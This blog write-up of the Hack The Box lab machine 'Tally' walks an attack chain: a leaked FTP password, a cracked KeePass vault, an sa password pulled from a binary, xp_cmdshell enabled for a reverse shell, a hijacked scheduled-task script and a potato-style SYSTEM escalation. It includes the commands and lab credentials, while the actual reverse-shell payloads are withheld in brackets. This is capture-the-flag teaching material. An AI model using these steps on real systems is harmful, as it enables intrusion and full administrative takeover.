---
layout: post
title: "The Ledger That Audited Itself"
subtitle: "HTB Tally, a Windows accounting server where every secret is filed one folder deeper, and the trail of receipts walks you from a SharePoint document library all the way to a scheduled task running as Administrator"
date: 2018-05-12 12:00:00 +0000
description: "A Hard Windows box that is one long paper trail: a SharePoint library leaks an FTP password, the FTP hides a KeePass vault, the vault opens a share, the share hides a database password, and the database hands you a shell you escalate twice over."
image: /assets/og/the-ledger-that-audited-itself.png
tags: [hackthebox, writeup]
---

Tally is an accounting server, and it keeps books the way a bad accountant keeps books. Every secret is real, every secret is written down, and every secret is filed one drawer deeper than the last. You do not break into Tally. You audit it. A SharePoint document library hands you an FTP password. The FTP hands you a locked KeePass vault. The vault hands you a share password. The share hides a compiled binary with a database connection string baked into it. The database lets you run commands, and that drops you onto the box as a user named sarah. Then a scheduled task that anyone can edit, running every hour as Administrator, hands you the building. There is no single clever exploit here. There is a chain of receipts, each one pointing at the next, and the whole box is the discipline to keep following the trail when it goes quiet.

```
        T A L L Y   &   C O .   L E D G E R
        ===================================
        sharepoint library   →  ftp password (in a .docx)
                 |
                 v
        ftp drop              →  tim's keepass vault (locked)
                 |
                 v
        cracked vault         →  share password (Finance)
                 |
                 v
        smb share             →  tester.exe  (sa password inside)
                 |
                 v
        mssql xp_cmdshell     →  shell as sarah
                 |
                 v
        a script anyone can edit, run hourly as admin
                                            簿
```

## 0x01 · the front desk

The scan comes back loud. Tally answers on more than twenty ports, which by itself is the box telling you it is a real Windows server doing real jobs, not a stripped-down lab target. The shape of it matters more than the count.

```
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
80/tcp    open  http          Microsoft IIS 10.0 (SharePoint)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2016
5985/tcp  open  http          WinRM
```

FTP, a SharePoint site on 80, the SMB stack, and a SQL Server on 1433. Each of those is a filing cabinet, and the trick of this box is realizing they reference each other. Most boxes give you one door and a climb. Tally gives you a row of locked drawers where the key to each one is taped inside the one before it. The work is patience.

## 0x02 · reading the company files

SharePoint is a document management system. Think of it like a shared office drive with a web front end, the place a company parks its spreadsheets, its meeting notes, and the file somebody named `ftp-details.docx` because they were going to delete it later and never did. You enumerate it the way you would dust a desk, methodically, opening every drawer SharePoint exposes. The Site Pages and the document libraries are the drawers that matter.

Two things fall out. A list of staff usernames, sarah and tim and rahul among them, and a document spelling out the FTP login in plain words.

```
ftp_user : UTDRSCH53c"$6hys
```

That is the first receipt. A password should never live in a document a stranger can read, but a password written down for convenience is the original sin of every office, and Tally is built entirely on it. Log into FTP with that and the trail keeps going.

## 0x03 · the drop folder

The FTP root is a clutter of files, more than a hundred of them, the digital equivalent of a shared folder nobody ever cleans. Most of it is noise. Two things in the noise are gifts. A Firefox 44 installer, which is a fingerprint of an old browser sitting on the box, and a file named `tim.kdbx`.

That `.kdbx` extension is a KeePass vault. Picture a KeePass file as a safe deposit box that holds all of a person's other keys behind one master combination. Crack the master and every password tim ever saved spills out at once. You do not get to brute the safe in place. You photograph it and crack the photo offline, which is exactly what the KeePass tooling does.

```
$ keepass2john tim.kdbx > tim.hash
$ hashcat -m 13400 tim.hash rockyou.txt
...
tim.kdbx:simplementeyo
```

`simplementeyo` opens the vault. Inside, among tim's saved entries, is a credential for a file share.

```
Finance : Acc0unting
```

Three drawers down and we are still only reading receipts. Nobody has been hacked yet. People filed their secrets, and we are following the paper.

## 0x04 · the binary that talked

The `Finance` credential opens an SMB share named ACCT. SMB is just Windows file sharing, the same protocol behind every `\\server\folder` path in an office. Mount the share and walk it, and in a migrations folder sits a compiled program, `tester.exe`.

Here is the move that separates Tally from an easy box. A connection string is the address and password a program uses to reach its database, and lazy developers hard-code it straight into the binary. So you do not run the program. You read it like a document. Throw `strings` at it, or open it in a disassembler, and the database secret is sitting there in plaintext because a compiler does not encrypt the words you hand it.

```
$ strings tester.exe | grep -i pwd
DRIVER={SQL Server};SERVER=TALLY,1433;DATABASE=orcharddb;UID=sa;PWD=GWE3V65#6KFH93@4GWTG2G;
```

`sa` is the SQL Server superuser account, the database equivalent of root, and its password just fell out of an executable. The receipt chain has led from a Word document to a domain administrator of the database engine.

## 0x05 · the database that runs errands

SQL Server has a feature called `xp_cmdshell`, a stored procedure that lets a database administrator run operating system commands straight from a SQL query. It ships disabled because it is exactly as dangerous as it sounds. As `sa` you are allowed to turn it back on. Think of it like a librarian who is only supposed to fetch books, but who also keeps a master key to the whole building in her desk, and you just proved you are her boss.

Connect with a SQL client and flip the switch.

```
$ mssqlclient.py 'sa:GWE3V65#6KFH93@4GWTG2G@10.10.10.59'
SQL> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
SQL> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
SQL> EXEC xp_cmdshell 'whoami';
tally\sarah
```

The database runs as the user sarah, so every command you push through `xp_cmdshell` runs as sarah too. Push a reverse shell through it and you land on the box as a real user.

```
SQL> EXEC xp_cmdshell '[ powershell reverse shell over TCP back to 10.10.14.4 on 443 ]';
```

I am describing the payload in brackets rather than printing it, and that restraint is the lesson, not the laziness. A live reverse shell is a copy-paste backdoor, and the only safe place for one is a lab you own. Catch it on your listener and the prompt comes back wearing sarah's name.

```
$ nc -lvnp 443
connect to [10.10.14.4] from TALLY [10.10.10.59]
PS C:\> type C:\Users\sarah\Desktop\user.txt
████████████████████████████████
```

## 0x06 · the chore that ran as the boss

Sarah is an ordinary user. The climb to Administrator is the most human bug on the whole box, and it has nothing to do with memory corruption. Sitting in a path sarah can reach is a PowerShell script, `SPBestWarmUp.ps1`, the kind of housekeeping script a SharePoint admin schedules to keep the site warm. Check who is allowed to edit it.

```
PS C:\> icacls SPBestWarmUp.ps1
SPBestWarmUp.ps1 BUILTIN\Users:(F)
```

`(F)` is full control, granted to the Users group, which includes sarah. Now check who runs it. A scheduled task fires that exact script every hour, and it runs as Administrator. Picture a night-shift cleaner who follows a checklist taped to the wall, and the checklist is written in pencil, and anyone walking past can erase a line and write a new one. The cleaner has the master keys. The cleaner does whatever the wall says.

So sarah erases the line and writes her own. Overwrite the script with a second reverse shell, start a listener, and wait out the clock.

```
PS C:\> Set-Content SPBestWarmUp.ps1 '[ powershell reverse shell back to 10.10.14.4 on 444 ]'
PS C:\> # the hourly task runs it as Administrator
```

Within the hour the task fires, runs the attacker's script with Administrator's token, and the shell comes back as the boss.

```
$ nc -lvnp 444
connect to [10.10.14.4] from TALLY [10.10.10.59]
PS C:\> whoami
tally\administrator
PS C:\> type C:\Users\Administrator\Desktop\root.txt
████████████████████████████████
```

## 0x07 · the other road to system

Tally was built by an author who likes to leave more than one path open, and the shell you got from MSSQL holds a second key. Run `whoami /priv` on the sarah shell and `SeImpersonatePrivilege` is enabled. That privilege is the right to act as another user once you can make them connect to you, and Windows service accounts get it by default for reasons that made sense in 1999 and have aged like milk.

This is the family of exploits everyone calls the Potatoes. The short version. You trick a privileged Windows service into authenticating to a listener you control, you catch its identity mid-handshake, and you wrap your own process in it. Think of it like a coat check that hands the coat to whoever holds the ticket, and you have learned to forge the ticket of the most important guest in the room.

```
PS C:\> whoami /priv | findstr SeImpersonate
SeImpersonatePrivilege   Enabled
PS C:\> .\iceberg-potato.exe -p "C:\programdata\nc64.exe" -a "[ reverse shell to 10.10.14.4 on 445 ]"
PS C:\> whoami
nt authority\system
```

There is even a third route, CVE-2017-0213, a Windows COM token-handling bug that escalates a local user straight to SYSTEM, left open because the box is missing the patch that closed it. Three roads, one destination. The scheduled task is the one I would lose sleep over, because nothing about it is a missing update. The script permissions are doing precisely what they were told.

## 0x08 · the honest caveat

It is tempting to read Tally as a string of unrelated mistakes, but it is really one mistake repeated until it became a hallway. A password in a SharePoint document. A vault crackable with a wordlist. A connection string compiled into a binary. A script anyone could edit. None of those is exotic, and not one of them is a buffer overflow. Every link in the chain is the same confession written in a different hand. A secret was written down somewhere a person without the secret could reach it.

That is the part the CVE list never captures. You can patch CVE-2017-0213 on a Tuesday. You cannot patch the habit of saving the FTP password into a Word file because deleting it later felt like effort. The whole box is a meditation on the half-life of a written-down secret, which is to say it never decays. The `.docx` from 2017 still reads cleanly. The KeePass vault still cracks. A binary still answers `strings` honestly, because a compiled program is not a vault, it is a window with a curtain you can pull aside.

And the scheduled task is the quiet horror. It shipped green. No exploit ran, no version was outdated. An admin granted a group write access to a script and then ran that script as Administrator, and the file system did exactly what it was told. The chain on Tally is long, but every drawer in it was unlocked from the inside, by someone trying to be helpful.

## 0x09 · outro

```
the company wrote every secret down.
each one pointed at the next, like footnotes in a ledger.
we never picked a lock. we just read the receipts in order.

a document. a vault. a binary. a chore the boss never watched.
patience walked the trail the whole way to administrator.

follow the paper. mind what runs as root. wear black.

                                                            EOF
```

---

*HTB: Tally, retired 05 May 2018. A hard Windows box that is really one long lecture on the half-life of a written-down secret. Every drawer was unlocked from the inside, and patience held the only key that mattered.*